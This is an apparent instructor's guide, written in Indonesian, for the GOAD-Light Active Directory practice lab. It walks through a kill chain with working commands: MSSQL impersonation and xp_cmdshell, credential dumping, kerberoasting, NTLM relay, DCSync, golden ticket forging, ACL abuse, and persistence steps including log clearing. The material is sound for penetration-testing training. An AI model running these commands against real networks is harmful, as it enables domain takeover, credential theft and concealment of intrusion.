# Skenario Lanjutan — GOAD-Light (Fall of the North → King's Landing)

Lanjutan dari skenario pertama (Fase 8: RDP `jon.snow` ke `castelblack`), **disesuaikan untuk GOAD-Light** (tanpa domain `essos.local`).

> GOAD-Light = 3 VM: `kingslanding .10` (DC sevenkingdoms.local), `winterfell .11` (DC north), `castelblack .22` (IIS + MSSQL, **Defender off**).
> **Yang TIDAK ada di GOAD-Light:** essos/cross-forest, MSSQL trusted link, Zerologon, PetitPotam unauth, ESC4/ESC2/ESC3.

---

## Fase 9 — Post-Exploitation di castelblack (jon.snow)

`jon.snow` = **MSSQL admin** + RDP (Stark/Night Watch), bukan local admin.

```powershell
whoami /all
net user /domain
net group "Domain Admins" /domain
```

**Target data:**
- `robb.stark` → bot LLMNR 3 menit (session hadir di castelblack) + **admin winterfell**
- `samwell.tarly` → password di LDAP description + **GPO edit "STARKWALLPAPER"**
- `jeor.mormont` → ACL writedacl-writeowner pada group "Night Watch"

---

## Fase 10 — MSSQL Impersonation → SYSTEM

```bash
mssqlclient.py NORTH/jon.snow:iknownothing@192.168.56.22 -windows-auth
# enum_impersonate
#  -> samwell.tarly (login) -> sa ; arya.stark (user) -> dbo
EXECUTE AS LOGIN = 'samwell.tarly'
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
xp_cmdshell whoami   # NT Service\MSSQLSERVER
```

---

## Fase 11 — Dump LSASS (Defender OFF di castelblack)

```bash
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22
# robb.stark bot login -> hash/plaintext robb.stark (admin winterfell)
# samwell.tarly -> ambil password dari LDAP description
# jeor.mormont -> admin castelblack (via ACL Night Watch)
```

---

## Fase 12 — Kerberoasting + GPO Abuse

```bash
# 12.1) jon.snow punya SPN -> kerberoast
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/jon.snow:iknownothing -outputfile rb.hashes
hashcat -m 13100 -a 0 rb.hashes /usr/share/wordlists/rockyou.txt

# 12.2) samwell.tarly -> edit GPO "STARKWALLPAPER" -> RCE
# (pyGPOabuse: tambah scheduled task / startup script ke winterfell)
```

---

## Fase 13 — NTLM Relay → DA NORTH (lompatan kunci)

`eddard.stark` = **DA NORTH** (bot LLMNR 5 menit), `robb.stark` (bot 3 menit).

```bash
sudo responder -I eth0 -wd
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
#  targets.txt = 192.168.56.11
#  -> relay hash eddard.stark -> sesi DA NORTH
```

---

## Fase 14 — DCSync NORTH + Golden Ticket

```bash
secretsdump.py -just-dc north.sevenkingdoms.local/eddard.stark:'<hash>'@192.168.56.11
ticketer.py -nthash <krbtgt_nthash> -domain-sid <NORTH-SID> \
  -domain north.sevenkingdoms.local Administrator
```

---

## Fase 15 — Cross-Domain (Child→Parent) ke sevenkingdoms.local

Tidak ada cross-forest di GOAD-Light, tapi **trust child→parent** tetap ada. Jalur:

**15.1) SID History / inter-realm ticket (jika sudah DA NORTH)**
- Forge golden ticket dengan **SID History = Enterprise Admins / Domain Admins parent** → akses ke `sevenkingdoms.local`.

**15.2) Atau lewat rantai ACL di sevenkingdoms** (via trust, user utara yang punya akses):

```bash
# tywin.lannister  : ForceChangePassword pada jaime.lannister
#  -> jaime.lannister : GenericWrite joffrey.baratheon
#    -> joffrey.baratheon : WriteDACL tyron.lannister
#      -> tyron.lannister : Self-Membership Small Council
#        -> Small Council : AddMember Dragonstone
#          -> Dragonstone : WriteOwner Kingsguard
#            -> Kingsguard : GenericAll stannis.baratheon
#              -> stannis.baratheon : GenericAll komputer kingslanding
#                -> RBCD takeover kingslanding -> DA
```

**15.3) Jalur cepat DA sevenkingdoms (jika user berikut didapat):**
- `lord.varys` → GenericAll grup **Domain Admins**
- `petyr.baelish` → writeproperty grup **Domain Admins**
- `maester.pycelle` → write owner grup **Domain Admins**
- `stannis.baratheon` → writeproperty self-membership **Domain Admins**

```bash
# contoh: tambahkan diri ke Domain Admins via lord.varys / petyr
net rpc group addmem "Domain Admins" <user> -U sevenkingdoms.local/<user>%<pass> -S 192.168.56.10
```

---

## Fase 16 — DCSync sevenkingdoms → Full Compromise

```bash
secretsdump.py -just-dc sevenkingdoms.local/cersei.lannister:'<pass>'@192.168.56.10
#  atau setelah RBCD: getST -impersonate administrator -spn CIFS/kingslanding...
```

---

## Fase 17 — Persistence & Cleanup

```bash
# Golden/Silver ticket (north + sevenkingdoms)
# AdminSDHolder / skeleton key (Defender aktif di DC)
# DSRM backdoor, ACL persistence
# wevtutil clear-log (hapus jejak)
```

---

## Ringkasan Kill-Chain GOAD-Light

| Fase | Teknik | Target | Output |
|---|---|---|---|
| 9 | Local enum | castelblack | foothold validasi |
| 10 | MSSQL impersonation + xp_cmdshell | castelblack | SYSTEM |
| 11 | LSASS dump (defender off) | castelblack | hash robb/samwell/jeor |
| 12 | Kerberoast + GPO abuse | winterfell | admin winterfell |
| 13 | **NTLM relay eddard.stark** | winterfell | **DA NORTH** |
| 14 | DCSync + golden ticket | north | kontrol north |
| 15 | Child→parent trust + ACL chain | sevenkingdoms | jalur ke DA |
| 16 | DCSync | kingslanding | **DA sevenkingdoms** |
| 17 | Persistence | semua | persistensi |

---

## Catatan Pengajar

- **Tidak ada essos** → Fase 15/16 GOAD-Light langsung lompat dari DA North ke sevenkingdoms via *trust* (child→parent), bukan cross-forest.
- **MSSQL trusted link** tidak tersedia (butuh braavos); ganti dengan jalur ACL + SID History.
- **Kerberoast target** di GOAD-Light = `jon.snow` (punya SPN), bukan robb.stark.
- **ADCS**: ESC1 mungkin masih ada (ESC4/ESC2/ESC3 dihapus) — cek `certipy find` sebelum dipakai.
- Kunci utama tetap **Fase 13 (NTLM relay)** → lompatan ke DA North tanpa crack password.
